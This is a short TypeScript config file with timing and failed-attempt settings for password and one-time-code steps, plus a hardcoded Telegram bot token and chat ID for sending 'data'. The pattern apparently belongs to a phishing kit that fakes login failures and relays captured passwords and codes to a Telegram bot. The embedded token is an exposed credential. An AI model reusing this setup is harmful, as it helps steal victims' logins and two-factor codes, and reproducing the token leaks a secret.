interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 3000,
    max_failed_code_attempts: 2,
    max_failed_password_attempts: 1,
    password_loading_time: 7000,
  },
  telegram: {
    data_chatid: "1224507547",
    data_token: "8017190231:AAGO3RYyBh6HsMqvYrpBeoSXXuYxnwHBm24",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
